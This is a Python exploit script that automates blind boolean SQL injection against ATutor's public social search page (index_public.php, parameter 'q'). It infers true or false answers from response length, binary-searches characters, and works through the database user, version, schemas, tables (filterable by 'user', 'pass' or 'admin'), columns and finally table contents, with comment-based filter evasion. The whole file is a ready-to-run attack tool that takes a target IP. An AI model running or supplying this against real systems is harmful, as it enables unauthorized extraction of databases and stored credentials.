#!/usr/bin/env python3
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
#  Author: Maximilian Marx


import sys
import requests
global_ip = "127.0.0.1"

def check_content_length(payload):
	target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (global_ip, payload)
	r = requests.get(target)
	content_length = int(r.headers['Content-Length'])
	
	# Valid match = 171 Byte, invalid match = 20 Byte
	if(content_length > 20):
		return True
	return False

def binary_search_find_char(index, inject_payload):
	a = range(32, 126)
	mid = 0
	start = 0
	end = len(a)

	while(start <= end):
		mid = (start + end) // 2
				
		payload_equal = "w00tw00t')/**/or/**/(ascii(substring((select/**/" + inject_payload + "),%d,1)))=%s%%23" % (index, str(a[mid]))
		payload_less = "w00tw00t')/**/or/**/(ascii(substring((select/**/" + inject_payload + "),%d,1)))<%s%%23" % (index, str(a[mid]))
				
		if(check_content_length(payload_equal)):
			return chr(a[mid])

		elif(check_content_length(payload_less)):
			end = mid - 1
		else:
			start = mid + 1
	return None

def count_number_of_matches(inject_payload):
	i = 0
	
	while(True):
		payload = "w00tw00t')/**/or/**/("+ inject_payload +")=%s%%23" % i
		result = check_content_length(payload)
				
		if(result):
			return i
		else:
			i += 1	
	return None

def helper_enumerate(payload):	
	i = 1
	result = ""
	
	while(True):
		found_char = binary_search_find_char(i, payload)
		
		# Print the found character, but also return the whole "word"
		if(found_char != None):
			sys.stdout.write(found_char)
			sys.stdout.flush()
			
			result += found_char
			
			i += 1
			
		else:
			print("\n")
			return result

def enumerate_database():
	
	print("[*] Checking current user....")
	enumerate_user_template = "current_user()"
	helper_enumerate(enumerate_user_template)
	
	print("[*] Checking database version....")
	enumerate_db_version_template = "version()"
	helper_enumerate(enumerate_db_version_template)
	
	print("[*] Checking existing databases....")
	enumerate_databases_template = "select/**/count(*)/**/from/**/information_schema.schemata"
	amount_databases = count_number_of_matches(enumerate_databases_template)
	print("[+] Found %s databases." % amount_databases)
	
	print("\n[*] Checking database names....")
	
	for i in range(0, amount_databases):
		enumerate_databases_names_template = "schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/%s,1" % i
		helper_enumerate(enumerate_databases_names_template)
	
	
	target_database = str(input("[*] Enter target database: "))
	
	print("\n[*] Checking database tables....")
	enumerate_tables_template = "select/**/count(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/=/**/'%s'" % target_database
	amount_tables = count_number_of_matches(enumerate_tables_template)
	print("[+] Found %d tables." % amount_tables)
	
	enumerate_all_tables = str(input("\n[?] Do you want to list all tables (might take a few seconds)? (Y/N) "))
	if(enumerate_all_tables == "Y"):	
		for i in range(0, amount_tables):
			print("[*] Enumerating all tables within '%s'. You can grab a coffee until that's done." % target_database)
			enumerate_all_tables_template = "table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/=/**/'%s'/**/LIMIT/**/%s,1" % (target_database, i)
			helper_enumerate(enumerate_all_tables_template)	
	else:
		enumerate_table_keyword = str(input("[?] Do you want to list all tables containing a specific keyword (eg. user, pass, admin)? (Y/N) "))
		if (enumerate_table_keyword == "Y"):
			table_keyword = str(input("[+] Enter keyword: "))
			print("\n[*] Enumerating tables within %s matching %s." % (target_database, table_keyword))

			# We cannot use LIKE '%keyword%', because this breaks this SQL injection.
			# Luckily we can use the alternative: RLIKE 'keyword' which seems to work fine 
			enumerate_tables_keyword_template = "select/**/count(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/=/**/'%s'/**/AND/**/table_name/**/RLIKE/**/'%s'" % (target_database, table_keyword)
			amount_tables_keyword = count_number_of_matches(enumerate_tables_keyword_template)
			print("[+] Found %d table(s)." % amount_tables_keyword)
			
			for i in range(0, amount_tables_keyword):
				enumerate_table_matching_keyword_template = "table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/=/**/'%s'/**/AND/**/table_name/**/RLIKE/**/'%s'/**/LIMIT/**/%i,1" % (target_database, table_keyword, i)
				helper_enumerate(enumerate_table_matching_keyword_template)
	
	target_table = input("[?] Enter target table to dump: ")
	
	print("\n[*] Checking table columns....")
	enumerate_target_tables_columns_template = "select/**/count(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema/**/=/**/'%s'AND/**/table_name/**/=/**/'%s'" % (target_database, target_table)
	amount_columns = count_number_of_matches(enumerate_target_tables_columns_template)
	print("[+] Found %d columns." % amount_columns)
	
	print("\n[*] Enumerating all columns within '%s'." % (target_table))
	columns_array = []
	for i in range(0, amount_columns):
		enumerate_column_names_template = "column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema/**/=/**/'%s'AND/**/table_name/**/=/**/'%s'/**/LIMIT/**/%s,1" % (target_database, target_table, i)
		columns_array.append(helper_enumerate(enumerate_column_names_template))
	
	print("[*] Checking table entries....")
	enumerate_target_tables_template = "select/**/count(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema/**/=/**/'%s'/**/AND/**/table_name/**/=/**/'%s'" % (target_database, target_table)
	amount_target_table_entries = count_number_of_matches(enumerate_target_tables_template)
	print("[+] Found %d entry/ies." % amount_target_table_entries)	
	
	print("\n[*] Dumping table %s." % target_table)
	
	for column in columns_array:

		# 1. Enumerate length of each column entry
		# 2. Iterate over the entry
		enumerate_column_entry_length = "select/**/length(%s)/**/from/**/%s.%s" % (column, target_database, target_table)
		column_entry_length = count_number_of_matches(enumerate_column_entry_length)
		print("[+] %s has %s characters." % (column, column_entry_length))
		
		enumerate_column_value_template = "%s/**/FROM/**/%s.%s/**/LIMIT/**/%s,1" % (column, target_database, target_table, amount_target_table_entries-1)
		helper_enumerate(enumerate_column_value_template)
		
	
def main():
	global global_ip
	if len(sys.argv) != 2:
		print("[+] Usage: %s <target>" % sys.argv[0])
		print("[+] Example: %s 192.168.128.146" % sys.argv[0])
		sys.exit(-1)

	global_ip = sys.argv[1]

	print("[*] Starting to enumerate the DB....")
	enumerate_database()
	print("\n[+] Done.")


if __name__ == "__main__":
	main()
